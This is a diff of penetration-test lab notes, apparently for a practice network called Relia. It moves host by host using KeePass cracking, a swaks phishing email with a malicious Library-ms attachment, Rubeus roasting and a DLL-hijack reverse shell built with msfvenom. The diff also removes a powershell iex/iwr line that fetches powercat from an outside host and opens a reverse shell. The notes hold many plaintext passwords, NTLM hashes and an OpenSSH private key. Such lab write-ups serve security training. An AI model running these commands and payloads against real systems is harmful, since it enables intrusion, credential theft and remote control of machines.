@@ -24,7 +24,19 @@ in powershell history at C:\Users\adrian\AppData\Roaming\Microsoft\Windows\Power
 
 damon : i6yuT6tym@
 
-## Legacy .189
+## External .248
+
+Enumerate smb and get the kdbx file. Crack it.
+
+Enter with remmina
+
+wit winpeas we can find the appkey `!8@aBRBYdb3!` that is mark password
+
+## WEB02 .245
+
+
+
+## Mail .189
 
 Download /staging/.git from .249 to analyze the commits
 
@@ -32,11 +44,76 @@ maildmz@relia.com:DPuBT9tGCBrTbR
 
 now use this attack [https://github.com/gustanini/WinLib\_Gen](https://github.com/gustanini/WinLib_Gen)
 
+{% code overflow="wrap" %}
+```
+sudo swaks  -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap 
+```
+{% endcode %}
 
+\
+and get a remote shell from .146.14 inside the internal network
+
+### 16.x.14 / WK01
+
+Crack the kdbx in the documents folder of jim to found password "mercedes1" of kdbx.
+
+Inside all the passwords.
+
+dmzadmin:SlimGodhoodMope
+
+jim@relia.com:Castello1!
+
+use rubeus to asperoast and get the michelle credentials
+
+michelle : NotMyPassword0k? &#x20;
+
+### 16.x.7
+
+we can rdp as michelle
+
+We have a service: _C:\Scheduler\scheduler.exe_ that has a dependency **customlib.dll**.
+
+We will get the executable on our machine and analyze it for DLL hijacking.
+
+Check this: [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#finding-missing-dlls](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#finding-missing-dlls)
+
+We will find: **beyondhelper.dll** is missing.
+
+We will create a malicious DLL (make sure to use x64 arch).
 
 {% code overflow="wrap" %}
 ```
-powershell.exe -c "iex (iwr -UseBasicParsing http://192.168.190.250:80/powercat.ps1);powercat -c 192.168.190.250 -p 4444 -e powershell"
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.227 LPORT=80 -f dll -o beyondhelper.dll
 ```
 {% endcode %}
+
+Administrator::8b4547a5116dd13e6e206d1286a06b28
+
+andrea:PasswordPassword\_6:ce3f12443651168b3793f5fbcccff9db
+
+### 16.x.15
+
+login with rdp using andrea credentials
+
+Now modify the schedule.ps1 to launcha reverse shell
+
+on documents we found kdbx with password : destiny1
+
+milana : 2237ff5905ec2fd9ebbdfa3a14d1b2b6
+
+sarah private key
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
+YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
+AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
+YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### 16.x.19
+
+enter with sarah id\_rsa
 
